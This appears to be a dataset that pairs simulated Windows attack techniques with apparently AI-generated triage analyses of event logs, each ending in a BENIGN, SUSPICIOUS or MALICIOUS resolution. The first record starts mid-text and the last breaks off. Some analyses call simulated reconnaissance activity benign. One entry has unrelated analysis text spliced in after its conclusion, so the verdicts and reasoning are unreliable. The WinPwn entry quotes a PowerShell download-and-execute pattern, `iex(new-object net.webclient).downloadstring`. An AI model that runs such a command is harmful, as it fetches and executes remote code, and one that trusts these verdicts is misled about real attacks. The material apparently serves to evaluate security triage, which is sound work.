   - These events are consistent with routine update procedures and do not indicate malicious intent.

5. **Application Logs:**
   - Confirmed that Windows Defender is running and active, which suggests that any malicious activity could potentially be detected or prevented by this security software.

### Assessment:

- **BENIGN**: The majority of logged events appear to be consistent with typical Windows system operations, updates, and security mechanisms. There is no definitive evidence of malicious activity or compromise.
- The failed authentication attempts and PowerShell queries may warrant a further audit or monitoring if they are unexpected, but on their own do not confirm malicious intent.

### Recommendation:

1. **Monitoring**: Continue to monitor the activities of this host to ensure that no anomalous behavior is developing over time.
2. **Audit**: Verify with users or administrators if the PowerShell commands were expected or authorized. If necessary, investigate the context to ensure there was no unauthorized access or reconnaissance.
3. **Configuration Review**: Consider reviewing and enhancing monitoring and alerting around PowerShell execution, especially for scripts or commands that query sensitive resources.

Given the current evidence from the logs, the situation can be resolved as **BENIGN** at present, with recommendations for increased vigilance and monitoring."
WinPwn - GeneralRecon,"### Detailed Analysis

#### Sysmon Logs Analysis:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - Multiple entries indicate frequent execution of `wevtutil.exe` (EventRecordIDs: 17979, 17983, 17987, 17991, 17995) and `conhost.exe` (EventRecordIDs: 17980, 17984, 17988, 17992, 18000).
   - `wevtutil.exe` is typically used to query event logs. Multiple rapid executions without accompanying context or expected purpose could be suspicious.
   
2. **PowerShell Activity:**
   - Notably, a PowerShell script is executed (EventRecordID: 18005) with the intent of downloading and executing code from a GitHub repository. The command line includes the usage of `iex(new-object net.webclient).downloadstring(...)`, which is a known technique used by attackers to download and execute code. The script named `script.ps1` retrieved this way performs a task dubbed `Generalrecon`, suggesting reconnaissance activity.

3. **Use of `whoami.exe` and `Hostname.exe`:**
   - The commands `whoami.exe` (EventRecordID: 18001) and `hostname.exe` (EventRecordID: 17997) are executed, possibly for information gathering. On their own, these commands are not suspicious, but in context with PowerShell's use mentioned above, they could be part of a reconnaissance phase.

4. **Microsoft Edge Update and Installation:**
   - Valid processes related to Microsoft Edge update and installation appear in (EventRecordIDs: 18007, 18013, 18014, 18015). These activities seem normal given the structure and paths involved, indicating scheduled updates.

#### Windows PowerShell Log:

- Corresponding to Sysmon logs, PowerShell was initiated with suspicious arguments aimed at downloading and executing a script from a remote location. Such activity aligns with known malicious behavior patterns, where scripts are fetched and executed to avoid direct binary execution trails.
  
#### Application Log:

- Windows Defender appears to be active (Application EventRecordID: 2386), which provides a security layer that may help in detecting or preventing breaches. However, the presence of potentially malicious PowerShell activity wasn't flagged, suggesting possible evasion tactics.

### Assessment and Recommendation:

Based on the analysis of the provided logs, there are indications of potentially malicious activity, particularly linked to the use of PowerShell for executing external scripts, suggesting a compromise attempt. The use of `iex(new-object net.webclient).downloadstring(...)` to fetch remote scripts is a common technique in PowerShell attacks intended for data gathering or further exploitation.

**Resolution: SUSPICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Escalate and begin a detailed forensic analysis of `Server002` focusing on system changes coinciding with the discovered PowerShell activities.
   - Examine the downloaded script (`script.ps1`) from the GitHub repository to understand its full capabilities and intent.
   - Quarantine the system from the network to prevent potential lateral movement by adversaries.

2. **Further Investigations:**
   - Investigate the account `SERVER002\\admin_test` for unusual activity or signs of credential compromise.
   - Review firewall, AV, and proxy logs around the time of suspicious PowerShell executions for external data transfer or connections.

3. **Long-term Strategies:**
   - Reinforce PowerShell execution policies to mitigate unauthorized script execution attempts.
   - Implement enhanced monitoring and alerting for PowerShell execution and remote script fetching."
Permission Groups Discovery PowerShell (Domain),"Upon detailed analysis of the logs provided, I've come to the following conclusions:

1. **Sysmon Logs:**
   - Several instances of benign system utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `powershell.exe` being executed by the `SERVER002\admin_test` user. This activity is generally characteristic of routine administrative tasks or scripts.
   - Multiple entries related to Microsoft Edge Update service processes. These processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) are executed under the `NT AUTHORITY\SYSTEM` account, which is common for system and service-level operations in Windows.

2. **Windows PowerShell Logs:**
   - Execution of a PowerShell command `get-ADPrincipalGroupMembership` on the user environment variable `$env:USERNAME`. This could be a legitimate administrative function checking group memberships, often used in user account auditing or scripts.

3. **Application Logs:**
   - Entries related to edgeservice stopping, which align with service-related processes seen in the Sysmon logs. The stopping of a service can occur normally during system updates or maintenance cycles.

4. **System and Security Logs:**
   - Minimal data available here. No entries indicating unusual system behavior or security breaches.

**Assessment:**
The activities noted across the logs, such as using administrative tools, system utility executions, and the operation of legitimate update services (Microsoft Edge Update), reflect patterns consistent with everyday administrative tasks or scheduled updates.
- **Whoami.exe** and **Powershell.exe** usage, while often associated with more in-depth commands or scripts, don't appear malicious given their nature and context here.
- The consistent use of **Microsoft Edge Update** services is expected for regular application maintenance and does not present clear indicators of compromise.

**Resolution: BENIGN**
These logs reflect normal operational activities within a Windows system server environment. Given the context and content examined, there is no evidence indicating malicious activity or system compromise. As always, maintaining a vigilant eye on system logs for any future anomalies remains prudent. If specific suspicions or reasons for closer scrutiny exist beyond the logs provided, they may warrant further investigation based on those specific leads."
Remote System Discovery - net group Domain Computers,"Here's the breakdown and analysis of the log entries provided:

### 1. **System Logs:**
- **EventID 24 and 1 (Kernel-General and Windows Time Service)**
  - These events are related to time change operations, which are normal administrative functions often carried out by `svchost.exe` as part of its responsibilities. No suspicious activity is reflected here.

- **EventID 44, 43, and 19 (WindowsUpdateClient)**
  - These logs indicate a regular security intelligence update for Microsoft Defender Antivirus. This is routine behavior for updates and security patches, signifying system maintenance.

### 2. **Application Logs:**
- **SecurityCenter EventID 15**
  - This shows that Windows Defender is active, which is expected and normal.

### 3. **Sysmon Logs:**
- **Execution of Common Commands (whoami.exe, hostname.exe, cmd.exe, net.exe)**
  - These activities were executed by the user `SERVER002\admin_test` with `High` integrity level. `whoami` and `hostname` are harmless commands to ascertain user and machine information. `cmd.exe` executing `net group ""Domain Computers"" /domain` suggests enumeration of domain computers, typical for a network audit or reconnaissance task. Without further context, this action is not definitively suspicious, but it warrants attention given its association with discovery techniques that precede malicious activity.
  
- **Use of `wevtutil.exe`**
  - `wevtutil.exe` execution is seen multiple times. This utility is used to manage event logs and channels and can be used by administrators. However, frequent calls within a short period could indicate log manipulation, necessitating closer scrutiny to ensure it's part of regular administrative tasks.

### 4. **Security Logs:**
- **Time Change (EventID 4616) and Privileged Logons (EventID 4624, 4672)**
  - The time change correlates to maintenance tasks and shows `svchost.exe` execution, typical for system processes. Privileged logons with NTLM authentication from an external host (`DESKTOP-3HL5B2P`) could indicate normal remote access but require verification against standard user activities.
  
- **Repeated Events (EventID 5379)**
  - Authentication with Microsoft accounts failed consistently. While not inherently suspicious, it suggests repeated credential access attempts which should be investigated to ensure they did not originate externally or indicate a misconfigured service/application.

### 5. **Windows PowerShell Logs:**
- The logs provided do not contain any Windows PowerShell events for analysis.

### **Assessment:**
Based on the analysis above, the activities logged within this time window, particularly the domain enumeration and frequent event log manipulation via `wevtutil.exe`, merit further investigation. While no definitive malicious actions are clear-cut from the provided logs, the combination of reconnaissance-like activities and administrative task executions indicate possible suspicious behavior needing additional context.

### **Conclusion:**
- **Resolution: SUSPICIOUS**

1. **EdgeUpdate and Microsoft Edge Installer Activity:**
   - There are multiple executions of processes related to Microsoft Edge Update, such as `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`, both operating under the `NT AUTHORITY\SYSTEM` user. These processes handle the regular updating mechanisms of Microsoft Edge and don't inherently exhibit signs of malicious activity in a well-maintained system.
   - The series of events also include Microsoft Edge Installer processes executing update-related tasks. This aligns with routine software updates.

2. **PowerShell Script Execution:**
   - There is a PowerShell script (`powershell.exe`) executed by the user `SERVER002\admin_test` that retrieves and outputs browser history from Google Chrome to a file located in the `Downloads` folder. The command is structured with a loop to select URLs from Chrome history using regex.
   - While this action might seem suspicious due to its nature of extracting browsing history, it doesn't necessarily indicate malicious activity. It could be part of a legitimate troubleshooting or analysis task by an administrator.

3. **Usage of Core Windows Utilities:**
   - Tools like `whoami.exe` and `conhost.exe` are executed by `SERVER002\admin_test`. These utilities are frequently used for system information queries or command-line interactions. The log shows these processes as child processes of legitimate parent processes, suggesting habitual administrative activities.
   - The logs also depict `wevtutil.exe` executions, potentially for exporting or managing event logs, common in administrative tasks.

4. **Security and System Logs:**
   - Time synchronization events are visible in the Security and System logs, with services like `svchost.exe` managing time updates. These are typical of a Windows system maintaining time integrity through NTP services.

Remote Desktop Services Discovery via PowerShell,"Upon reviewing the provided logs, I have conducted a thorough analysis to identify any indicators of potential malicious activity or compromise. Here are the observations based on each log type:

### System Log:
- **Time Change Events**: There are several events where the system time was changed (`EventID 1` in Kernel-General and `EventID 4616` in the Security log). The process responsible is `svchost.exe`, running under `LOCAL SERVICE`. Although unusual time changes can sometimes indicate malicious activity like attempts to bypass security mechanisms, in this context, it appears to be under a standard service account, which might be related to normal time-synchronization activity.
  
### Sysmon Log:
- **Process Executions**: There are various executions of standard Windows binaries (`wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `powershell.exe`) by the user `SERVER002\\admin_test`. The commands executed are typical of administrative actions (e.g., checking service states via PowerShell, using Sysinternals tools). Specifically, the PowerShell command used is a service status check and does not indicate harmful intent by itself.
- **Edge Update Activity**: There are logs of the Microsoft Edge update process being executed (`MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe`), which appears to be a legitimate software update process under the `NT AUTHORITY\SYSTEM` account.
  
### Windows PowerShell Log:
- **PowerShell Activity**: A single PowerShell session executed (`Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""`), started and stopped normally. This is consistent with routine administrative checks on service status and not indicative of malicious activity.

### Security Log:
- **Admin Privileges**: There are several logon events for the user `admin_test` using NTLM from an external workstation (`DESKTOP-3HL5B2P`). While the privileges granted to the user can be a concern due to the broad nature of SeDebugPrivilege, SeBackupPrivilege, and others, the context does not suggest malicious exploitation during this session.

### Application Log:
- **Software Protection**: An event from the `Software Protection Platform Service` (`SPP`) was observed, which appears as a routine operation without any evident suspicious context.

### Overall Assessment:
- **Time Synchronization**: The time adjustments could be related to time synchronization activities or system maintenance scripts.
- **Administrative Activity**: The actions logged via Sysmon and PowerShell logs seem consistent with normal system administration and software updates.
- **No Execution of Unknown or Malicious Applications**: All observed processes and activities involve legitimate Windows binaries and known software, with no signs of unexpected or malicious applications executing.

### Conclusion:
Based on the analysis of the logs, the activities appear to be consistent with normal administrative maintenance on the system rather than malicious activity. While there are elements of administrative privilege usage and system changes (like time adjustments), they align with typical administrative functions and updates.

**Resolution**: BENIGN - The logs contain benign activity that corresponds to routine administrative tasks and system maintenance. No further investigation is required based on these log entries. However, maintaining regular monitoring is advised to ensure any true anomalies are promptly detected in future analyses."
Port Scan using python,"Based on the provided log entries, there's a combination of routine activities and some potentially suspicious patterns. Here's a detailed analysis:

### Suspicious Activities Identified

1. **PowerShell Command Execution:**
   - The logs reveal a PowerShell script initiating various commands:
     - **Download and Execute Python Installer:** A PowerShell command downloads a Python installer from the official Python FTP site. While using PowerShell for such tasks is not uncommon, execution from a temporary location (`C:\Users\ADMIN_~1\AppData\Local\Temp\`) could be suspicious, depending on context and purpose.
     - **Execution with Specific Arguments:** The installer is executed with silent installation arguments (`/quiet InstallAllUsers=1 PrependPath=1 Include_test=0`), which is typical for automated installations, but could also be used to avoid user detection.

2. **Executing Python Scripts:**
   - A Python script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data.py` is executed using PowerShell. The use of scripts in temporary directories could potentially be indicative of malicious intent if not scheduled or expected.

3. **Security Audit Events:**
   - The logs from the security auditing indicate queries for user account information (`EventID 4798`). The querying process is `CompatTelRunner.exe`, typically related to compatibility telemetry, which might indicate a potential attempt to gather user account information for further attacks. 
   - The role of `CompatTelRunner.exe` might be legitimate; however, unexpected querying of accounts can be suspicious if no known task or telemetry should be running.

4. **Sysmon Events:**
   - Multiple executions of `CompatTelRunner.exe` and processes like `wevtutil.exe` and `conhost.exe` potentially in quick succession. These are system utilities, sometimes used by attackers to enumerate and manipulate event logs or hide traces.
   - Processes running from temporary directories sometimes indicate an attempt at stealth. Specifically, `python_setup.exe` run from a temporary folder may imply a less-than-standard installation method.
   - Commands executing Python scripts combined with `AppInstallerPythonRedirector.exe` indicate an indirect launch, potentially to avoid detection.

### Malicious Indicators

- Use of common tools like PowerShell and Python scripting from temporary directories can indicate preparation or execution of malicious activities if such actions are unexpected for typical operations for this server (`Server002`).
- Although telemetry tasks may invoke `CompatTelRunner.exe`, querying user accounts via it should be closely examined, especially if there’s no known association with legitimate tasks.
- Administrator-like user (`admin_test`) running multiple processes indicates potential privilege context, making the activity more critical to review.

### Recommendation and Resolution

**Resolution: SUSPICIOUS**  
Due to unusual PowerShell activities and user account enumeration, the activities are suspicious and warrant further investigation.

**Guidance:**

1. **Verify Legitimacy:**
   - Confirm with relevant IT teams if there were scheduled tasks to install Python or execute the script.
   - Check if `CompatTelRunner.exe` was supposed to run by any maintenance or telemetry task.

2. **User Activity Review:**
   - Investigate actions by the `admin_test` account, particularly process launches and script executions.
   - Validate all administrative activities within the time frame to ensure they align with expected changes or updates.

3. **Monitoring and Alerts:**
   - Increase PowerShell logging and monitor for execution of scripts from temporary folders.
   - Set up alerts for user enumeration activities without clear business justification.

Should further signs of malice be found, initiate incident response procedures to contain and investigate the event thoroughly."
Windows Internal Packet Capture,"Based on the provided log entries, here's a detailed analysis:

1. **Application Log**:
   - The Software Protection Platform Service (SPP) has an entry, which appears benign as it corresponds to regular operations managing software licensing.

2. **Sysmon Log**:
   - There is repeated execution of ""wevtutil.exe"" and ""conhost.exe"" by the user ""SERVER002\\admin_test"". This might suggest log querying or triggering of certain operations. ""wevtutil.exe"" is a command-line utility for managing event logs and event sources and ""conhost.exe"" is used to manage console window processes, which could be related to legitimate administrative tasks if conducted by an authorized user.
   - Commands executed include ""HOSTNAME.EXE"", ""whoami.exe"", and ""cmd.exe"" with ""netsh trace start"". These utilities can be used for network diagnostics and gathering system information. While benign if used for legitimate administrative purposes, they can be red flags if executed by unauthorized personnel.

3. **System Log**:
   - There are events indicating system time changes by `svchost.exe`. While updating time is a regular activity, abrupt and unusual time alterations could be utilized by attackers to modify timestamps or evade detection. The reason for this behavior should be further explored.
   - The event indicates a legitimate update of the time source by the Windows time service.

4. **Security Log**:
   - Regular system logins (Event ID 4624) and privilege allocations (Event ID 4672) are noted for user SYSTEM, which seems routine. However, ensuring these actions are expected and authorized is crucial. Any unexpected changes or errors could indicate a privilege escalation attempt.

5. **Windows PowerShell Log**:
   - The PowerShell log is empty, indicating no PowerShell activity, which can be notable and might indicate activities were not conducted via PowerShell or logging was disabled.

### Assessment:
The logs contain several activities that could be indicative of routine administrative functions. However, there are certain behaviors such as frequent executions and system time modifications that warrant further scrutiny.

### Resolution:
- **SUSPICIOUS** - The logs contain actions that are not typically malicious on their own but are potentially indicative of misuse if not authenticated by proper authorization. The need for further investigation to determine whether these are part of regular administrative tasks or potential misuse is essential.

### Guidance:
1. Verify the legitimacy of the user ""SERVER002\\admin_test"" and corroborate whether these activities align with their role or usual operational procedures.
2. Investigate the purpose and approval for time changes in the system log, deterring potential timestamp manipulation.
3. Evaluate the necessity and context of tools and commands executed under this account.
4. Monitor the consistency of System behavior and logs for new anomalies or unexpected patterns.
5. Consider reviewing access logs and correlating security group policies, especially concerning privilege changes and elevated token usage.
"
List Process Main Windows - C# .NET,"The provided logs from various sources (Security, System, and Sysmon logs) give insight into the activity on the Windows host ""Server002"". Here's a breakdown of the notable events and an analysis of whether they indicate benign, suspicious, or malicious activity.

### Security Log Analysis:
- **Event ID 5379**: These logs indicate credential validation operations performed by the system account `SERVER002$`. The `ReturnCode` value `3221226021` (or `C0000215`) indicates a STATUS_LOGON_FAILURE error, which suggests failed attempts to retrieve credentials related to Microsoft accounts. Given that these operations are executed by the local machine account and manifest logon failures, these can potentially point towards a configuration issue or benign network scanning or credential syncing error, rather than overt malicious activity.

### System Log Analysis:
- **Event ID 44 and 43**: These events represent updates for Microsoft Defender Antivirus. The Security Intelligence Update (KB2267602) log entries are standard and expected behavior as part of regular system maintenance, ensuring that antivirus definitions are up-to-date.

### Sysmon Log Analysis:
- Multiple occurrences of `wevtutil.exe`, `conhost.exe`, `powershell.exe` processes invoked by the user `admin_test`. The command lines show utilities normally used for legitimate administrative tasks or potential script-based attacks. However, the command lines (especially `wevtutil.exe` involving log export) and the presence of `powershell.exe` without unusual command-line arguments suggest regular, albeit slightly concerning, administrative activities.
- **Compiled Code Execution**: The sequence involving `cmd.exe` executing a command to compile (`csc.exe`) and run (`data.exe`) C# code from a temporary directory can raise flags. This indicates custom code execution and could hint at a script or automated task, possibly even a pentest operation. The unique hash values for `data.exe` and the compile operations from disposable paths could suggest transient or one-time usage nature, increasing the perception of risk if not part of documented processes.
- **Windows Update executions and Microsoft Edge Installations**: Activities related to Windows Updates (`wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`) and Microsoft Edge update installations (`setup.exe`, `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe`) are observed. These appear consistent with regular software updates and system maintenance activities.

### Conclusion:

Though there is no single log entry that clearly depicts overtly malicious behavior, some activities in Sysmon logs, especially concerning custom code execution from temporary directories, warrant further analysis to ascertain legitimacy. Credential validation failures could indicate configuration issues rather than actual bypass attempts.

### Resolution:
- **SUSPICIOUS**: The activity, especially involving `csc.exe` compilation and the resulting execution from a temporary path, is unusual and could benefit from further investigation. It's recommended to validate these activities against known administrative or development processes to rule out unauthorized changes or potential script-based attacks. Follow up with strict monitoring, possibly validating hash values of the code against internal repositories, and ensure only required administrative tasks are being executed by `admin_test`.

### Guidance:
1. Review system configurations related to credential validation handling.
2. Validate the source and legitimacy of the compiled code in `data.exe`.
3. Ensure proper documentation of administrative tasks executed by users with elevated privileges.
4. Recommend enhanced logging and alerting mechanisms for similar future events."
Powershell enumerate domains and forests,"Based on the provided Windows event logs, here is a detailed analysis:

### Suspicious Activities Detected:

1. **Privilege Escalation:**
   - The event with ID **4672** shows that privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others, were assigned at a time that aligns with the suspicious PowerShell activities. The use of these privileges can indicate potential unauthorized attempts to access or modify system resources.

2. **PowerShell Execution:**
   - The logs show PowerShell execution with Event ID **600**, where a script from a temporary directory was executed. This script involves commands like `Get-NetDomainTrust`, `Get-NetForestTrust`, `Get-ADDomain`, and `Get-ADGroupMember Administrators -Recursive`. These are common reconnaissance commands used by attackers to gather information about the domain structure and administrative groups, suggesting potential lateral movement or preparation for a further attack stage.

3. **Use of `wevtutil` Tool:**
   - Multiple instances of `wevtutil.exe` execution are noted in the Sysmon log, which can be used to export event logs or modify logging configurations quietly. This behavior can be associated with attempts to cover tracks or modify evidence.

4. **Unusual User Activity:**
   - Activity by user `SERVER002\admin_test` is pervasive across logs. This user executed several uncommon processes and commands for standard administrative work. It includes the execution of potential reconnaissance scripts and running several system utilities.

### Malicious Indicators:

- **Temporary Script Execution:**
  The execution of a script from `C:\Users\ADMIN_~1\AppData\Local\Temp\` is highly suspect, as temporary directories are commonly used for executing scripts that are not intended to persist on the system.
  
- **Reconnaissance Commands in PowerShell:**
  Use of PowerShell to run commands to obtain detailed information about the domain environment and user groups, indicating potential enumeration for attack planning.

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate `Server002` from the network immediately to prevent any further lateral movement or data exfiltration.
   - Conduct a full antivirus scan and memory analysis to identify any running malicious processes or injected code.

2. **Investigation Steps:**
   - Analyze the `admin_test` user account for legitimacy, review account creation logs, and confirm the user should have had administrative access.
   - Review file changes and network connections during the timestamps of the suspicious activities to identify any data access or potential data exfiltration.

3. **Hardening Measures:**
   - Implement stricter PowerShell logging and execution policy to require scripts to be signed and verified.
   - Continuously monitor for high-value account activity and set alerts for the use of powerful privileges.

### Final Resolution:

**MALICIOUS - The logs contain activity indicative of unauthorized and potentially harmful behavior, including privilege escalation, domain reconnaissance, and use of system tools likely meant to obfuscate malicious actions.**"
Adfind - Enumerate Active Directory Subnet Objects,"**Analysis of the Windows Event Logs**

Upon reviewing the provided logs across different channels, the following observations are made:

**1. Application Log:**
- The application logs show multiple entries of Windows Defender being turned on. This is not inherently suspicious as it is a normal behavior of security software ensuring protection is active.

**2. Sysmon Log:**
- *wuauclt.exe*: This is a legitimate Windows Update client executable. Its invocation with parameters related to updates generally aligns with standard operations.
- *AM_Delta.exe* and *MpSigStub.exe*: These are related to Windows Defender definition updates, indicating routine operations for maintaining antivirus definitions up to date.
- *Powershell.exe* and *wevtutil.exe*: These are normal system utilities. While their usage by a benign system administrator is typical, their execution should be contextualized with organizational policies on script usage and event log management.
- Notably, *AdFind.exe* execution via *cmd.exe* is a tool often used for Active Directory reconnaissance. Its presence in the Temp directory and usage to filter objects by category is potentially suspicious as this tool is commonly leveraged in attack scenarios to gather information within a domain. However, the actual intent would need further verification.
- Various system processes such as *CompatTelRunner.exe*, *DeviceCensus.exe*, and *WindowsUpdate* components running under NT AUTHORITY\SYSTEM, appear to be standard Windows operations focused on telemetry and update management.

**3. Security Log:**
- Periodic SYSTEM account logons with elevated privileges (Logon Type 5) using Advapi suggest normal system service activities. All privilege escalations are executed under SYSTEM account privileges, which aligns with typical system operations.
- Several Event ID 5379 logs indicating credential validation failures with ""MicrosoftAccount:user=02txoixylodcstop"", which may suggest failed attempts to validate credentials against the Microsoft Account system. However, this looking like general system noise unless further context defines it as suspicious.

**4. System Log:**
- A Windows Update entry pertaining to the Defender Antivirus update further corroborates the hypothesis of routine system updates.

**Conclusion:**
Considering the context and the observed events in the logs, the main point of concern is the execution of *AdFind.exe*. This tool’s presence and use could potentially indicate suspicious activity. However, more context is needed to solidly confirm its role, such as any reports of unusual behavior or confirmations of its purpose from legitimate administrative scripts.

**Resolution: SUSPICIOUS**
- While most activities resemble regular system maintenance and updates, the presence and execution of *AdFind.exe* should be investigated further within the organizational context to confirm its legitimacy. Potential risks include internal reconnaissance possibly indicating a compromise. Further analysis such as checking associated network activity, verifying source, and assessing whether it's part of sanctioned administrative scripts or activity is recommended."
Wmic Group Discovery,"Upon reviewing the provided event logs, the following points stand out regarding the activity recorded:

1. **Application Logs**: The application logs indicate typical system operations without any indication of failure or unusual execution related to the Software Protection Platform Service.

2. **Sysmon Logs**: Analysis reveals several command-line executions:
   - Execution of `hostname.exe`, `whoami.exe`, and `cmd.exe` with typical arguments.
   - `wevtutil.exe` instances seem frequent, which could indicate the reading or manipulation of event logs, a behavior sometimes associated with attackers trying to cover tracks or analyze operations.
   - `cmd.exe` with `""cmd.exe"" /c wmic group get name` suggests enumeration of group memberships, which while not inherently suspicious, can be part of reconnaissance activities.
   - Regular instances of `conhost.exe` are observed, often paired with legitimate processes like `cmd.exe`, `WMIC.exe`, and others as expected.
   - All processes run by `SERVER002\\admin_test`, a user with high integrity level, could suggest an administrative user conducting benign operations, or potentially someone leveraging high privileges.

3. **System Logs**: The system logs detail time-change activity timestamps, which can correlate with NTP time sync and do not appear unusual independently.

4. **Security Logs**: Security logs similarly record time adjustments with no explicit security failures. The logs demonstrate consistency with the system logs and do not indicate any privilege escalation or attempted unauthorized access.

### Assessment:

**Suspicious**:
- The frequency and nature of the `wevtutil.exe` and WMIC executions can correlate with reconnaissance or log manipulation, often preceding a lateral movement or privilege escalation. The administrative user `admin_test` running such commands might need validation whether authorized or routine. 

### Recommendations:
- **Further Investigation**: Verify the intentions behind `wevtutil.exe` and `WMIC` commands. Determine if `admin_test`'s actions are part of scheduled routines or audits. Check if similar patterns occur frequently and if any corresponding alerts are triggered in network or endpoint protection solutions.
- **User Validation**: Examine if the operating user `admin_test` corresponds to known scheduled task executions or if the account might have been compromised.
- **Log Consistency**: Ensure system time sync is logged consistently with other network devices; check for any discrepancies that might indicate tampering with event timestamps.

Final resolution: **SUSPICIOUS** – The pattern of execution warrants deeper analysis to guarantee no underlying malicious activity."
Remote System Discovery - ping sweep,"Based on the provided Windows event logs from the Application, PowerShell, System, Sysmon, and Security channels, let's assess the situation:

### Analysis:

1. **Application Log:**
   - The Application log shows Windows Defender being in 'SECURITY_PRODUCT_STATE_ON', indicating that it is active and monitoring for threats. No suspicious activity is reported here.

2. **PowerShell Log:**
   - There are multiple PowerShell commands with restricted execution policy noted. One command is simply executing a PowerShell command to print ""Final result: 1"". Another command scans `.inf` files for specific installation references using a regex match.
   - While frequent PowerShell activity, especially ones examining `.inf` files can sometimes be a vector for malware or policy abuse, the lack of obfuscation and the clarity of execution policy suggest this may not be overtly malicious. The execution policy was restricted, which often limits the risk of unauthorized scripts.

3. **System Log:**
   - The System log entries are primarily related to Windows Update activities, including updates for Windows Defender Antivirus and various Microsoft components. These updates seem routine with no errors or aberrant patterns.

4. **Sysmon Log:**
   - There are multiple Sysmon entries showing various processes like `PING.EXE`, `cmd.exe`, and PowerShell commands.
   - Notably, the logs show `cmd.exe` being used to conduct a ping sweep across the network (“ping -n 1 -w 100...”), which could be interpreted as network scanning activity. However, it is being executed by the user `admin_test` from a known host, and there are no signs of privilege escalation or the execution of malicious executables.
   - The use of `wevtutil.exe`, `whoami.exe`, and system utilities like `wsmprovhost.exe` and `conhost.exe` aligns with system maintenance tasks or administrative behavior.

5. **Security Log:**
   - Several logs involving process creation tasks, credential retrieval attempts with return codes indicating no credentials returned, and security privileges being assigned to system processes.
   - The logs show administrative privileges being assigned to `admin_test` which include potentially sensitive privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.). However, these privileges must be regularly maintained by legitimate administrators. The source workstation `DESKTOP-3HL5B2P` should be verified to ensure it is an expected admin device.

### Conclusion:

- **Network Scanning Concerns:** The `cmd.exe` network ping sweep is the most notable suspicious behavior. It could represent a legitimate administrative task, but context (like verifying the user `admin_test` and any security policies surrounding network scans) is crucial to determine legitimacy.

### Resolution:

Given the analysis above, the log activities currently fall under:

- **Resolution:** **SUSPICIOUS** - The network scanning behavior observed requires further investigation to confirm whether it was an authorized administrative action. Further checks on user `admin_test`, associated IP addresses, and reviewing endpoint protection logs can provide clarity. Check for any security policies that allow or prevent such behavior, and ensure `admin_test` is performing expected tasks."
Windows Internal pktmon set filter,"Upon examining the provided Windows event logs, several points warrant closer inspection to determine if any malicious activity may be occurring on the host.

### Analysis of Log Entries:

1. **Frequent Execution of System Utilities:**
   - Repeated executions of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `PktMon.exe` by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is a legitimate tool for managing Windows Event Logs, but excessive use could be indicative of log tampering or information gathering.
   - `HOSTNAME.EXE` and `whoami.exe` execution might be part of routine administrative tasks; however, depending on the frequency, it could also signify reconnaissance activity.

2. **Command Line Execution Involving PktMon:**
   - There is a command line entry indicating `cmd.exe` is being used to run `pktmon.exe filter add -p 445`. `PktMon` is a legitimate packet monitoring tool, but using it with filter set for port 445 could suggest monitoring of SMB traffic, which may indicate scanning or an attempt to intercept network credentials.

3. **Adjustment of System Time:**
   - Security and System logs show a timestamp adjustment initiated by `svchost.exe` from the `LOCAL SERVICE` account. This can happen under legitimate circumstances but could also point to an attempt to manipulate log times as part of cover-up operations.

4. **User and Process Integrity Level:**
   - Actions are executed by `SERVER002\admin_test` with high integrity. This indicates the user is likely to have elevated privileges which, if compromised, could pose significant risks.

### Assessment:

- **BENIGN:** Some activities could be part of regular system administration tasks; however, execution patterns and command lines suggest non-standard use.
- **SUSPICIOUS:** The use of `pktmon.exe` in particular raises questions about the intent behind monitoring SMB traffic, which could potentially point to an active reconnaissance or data exfiltration effort. 
- **MALICIOUS:** No definitive evidence of malware or exploits, but the behavior indicates potential misuse of administrative privileges or preliminary stages of an attack.

### Conclusion:

**Resolution: SUSPICIOUS**

While none of the events definitively prove malicious activity, the combination of high-privilege execution of packet monitoring on network ports and repeated querying of system information commands is suspicious and suggests the need for further investigation.

### Guidance on How to Proceed:

1. **Verify Intent:**
   - Confirm whether the `SERVER002\admin_test` user executed these actions intentionally or if there is a possibility of credential compromise.

2. **Review Access Logs:**
   - Check Windows Security logs for any anomalous logon patterns associated with the `admin_test` account.

3. **Network Traffic Analysis:**
   - Assess network traffic, particularly on port 445, to identify any unusual or unauthorized access attempts.

Adfind - Enumerate Active Directory Admins,"Upon reviewing the provided event logs, the following key observations were made:

1. **Legitimate System Processes:**
   - Entries for `TiWorker.exe`, `TrustedInstaller.exe`, `SecurityHealthService.exe`, `taskhostw.exe`, and `wermgr.exe` indicate legitimate Windows system processes related to updates, security, task management, and error reporting. These processes are running under the `NT AUTHORITY\SYSTEM` account, which is typical for trusted system components.

2. **Admin User Activity:**
   - Multiple entries list processes such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` activity under the user `SERVER002\admin_test`. The use of `powershell.exe` can be common for administrative tasks, but it requires scrutiny due to its potential use for malicious activity.
   - Specific command lines, such as `cmd.exe` invoking `AdFind.exe`, could potentially be suspicious. `AdFind.exe` is a legitimate tool often used for Active Directory enumeration, but its use in a nuanced context could suggest reconnaissance activities.

3. **Security Logs:**
   - A login event (ID 4624) and a special privileges assignment event (ID 4672) were recorded. The logon type 5 indicates a service startup scenario. The privileges assigned include potentially dangerous ones like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, which are normal for system service accounts but can be concerning if misused.

4. **Security Software State:**
   - From the application logs, `Windows Defender` is reported as `SECURITY_PRODUCT_STATE_ON`, indicating that it is active and providing security coverage on the host.

**Assessment:**
